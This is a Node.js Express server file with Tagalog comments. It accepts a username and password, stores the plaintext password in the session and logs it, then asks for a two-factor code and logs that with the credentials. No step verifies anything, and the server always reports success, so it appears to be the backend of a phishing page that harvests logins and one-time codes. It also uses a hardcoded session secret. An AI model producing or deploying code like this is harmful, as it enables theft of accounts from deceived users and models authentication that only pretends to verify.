const express = require('express');
const bodyParser = require('body-parser');
const session = require('express-session');
const RedisStore = require('connect-redis')(session);
const { createClient } = require('redis');

const app = express();
const PORT = 3000;

// Redis client setup
const redisClient = createClient({
  legacyMode: true, // Gamitin kung may compatibility issues
  url: 'redis://localhost:6379',
});
redisClient.connect().catch(console.error);

// Middleware for parsing
app.use(bodyParser.urlencoded({ extended: true }));

// Session middleware
app.use(
  session({
    store: new RedisStore({ client: redisClient }),
    secret: 'supersecretkey', // Palitan ng mas secure na secret
    resave: false,
    saveUninitialized: false,
    cookie: { maxAge: 5 * 60 * 1000 }, // 5 minutes expiry
  })
);

// Serve static files (CSS, JS)
app.use(express.static('public'));

// Route: Home page
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});

// Route: Handle login
app.post('/submit', (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    res.status(400).send('Missing username or password.');
    return;
  }

  // Save username and password in session
  req.session.username = username;
  req.session.password = password;

  // Log data
  console.log(`Login Attempt - Username: ${username}, Password: ${password}`);

  res.redirect('/two-factor');
});

// Route: Two-Factor Authentication Page
app.get('/two-factor', (req, res) => {
  if (!req.session.username || !req.session.password) {
    return res.status(403).send('Session data is missing. Please log in again.');
  }

  res.send(`
    <form action="/verify-2fa" method="POST">
      <input type="number" name="authCode" placeholder="Enter 2FA Code" required>
      <button type="submit">Verify</button>
    </form>
  `);
});

// Route: Verify Two-Factor Code
app.post('/verify-2fa', (req, res) => {
  const { authCode } = req.body;

  // Check session data
  if (!req.session.username || !req.session.password) {
    console.error('Error: Session data is missing.');
    res.status(403).send('Session expired. Please log in again.');
    return;
  }

  // Log data
  console.log(
    `2FA Verification Attempt - Username: ${req.session.username}, Password: ${req.session.password}, 2FA Code: ${authCode}`
  );

  res.send('2FA verification successful!');
});

// Start server
app.listen(PORT, () => {
  console.log(`Server is running at http://localhost:${PORT}`);
});
